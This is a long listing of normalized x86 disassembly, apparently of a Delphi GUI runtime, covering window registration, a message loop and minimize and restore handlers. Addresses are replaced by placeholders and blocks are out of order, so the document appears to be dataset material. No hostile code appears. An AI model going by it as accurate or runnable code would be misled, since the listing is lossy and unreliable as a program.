push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404338
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_40690c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403e78
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_454e4c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_454e4c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_454378
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_4530ac
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4543d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41375c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43b390
cmp ebx eax
je r-xdata
sub_454448
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4543d8
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4138b8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_454560
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4138b8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4545fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c394
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4535b8
mov eax [ rw-data ]
call sub_453c00
sub_454654
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4546b1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4546b8
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404070
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4546c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4546fc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_454e4c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_454748
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4035c8#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4545fc
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_455868
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4138b8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43b390
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456794
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_455384
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_455328
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43b390
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454e4c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_453c00
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4546c0
pop ecx
jmp [ eax * 4 + jump_table_4547ec ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455200
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_43fd08
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_454654
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4190d0
jmp r-xdata
xor eax eax
call sub_44c488
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43b390
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_435d5c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454e68
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4546c0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_451e00
jmp r-xdata
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
push ebp
call sub_4546fc
pop ecx
jmp r-xdata
push ebp
call sub_4546c0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_454560
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454f18
jmp r-xdata
jmp r-xdata
call sub_42c460
call sub_42c540
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_454550
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454560
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454558
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44c338
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
call sub_44c3ec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4546c0
pop ecx
jmp r-xdata
call sub_42c460
call sub_42c59c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40cd3c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_454e68
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_454550
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_453e80
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43b390
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43b390
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_454f18
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_453e80
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43b390
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_454560
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43b390
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_44fb8c
mov eax [ ebx + 0x44 ]
call sub_451fa8
sub_455018
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_455054
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ecc
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403f68
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_4550a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_4550c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_455114
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_431a40
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43b390
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_4551cc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45612c
sub_455200
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43b390
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403324
test al al
jne r-xdata
sub_45526c
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4551cc
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4550c4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_455114
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4550a0
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_455304
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45526c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_455bd4
sub_455328
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413898
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41375c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_455384
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4138b8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4137a8
jmp r-xdata
sub_455418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4035c8#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43b36c
mov [ esi + 0x44 ] edi
sub_455498
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_455576
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44c2b0
call sub_407a04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45557d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_44fb8c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4035c8#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_455304
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_44ea94
mov eax [ ebp - 0x4 ]
call sub_454e68
jmp r-xdata
sub_455598
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4032b4
test al al
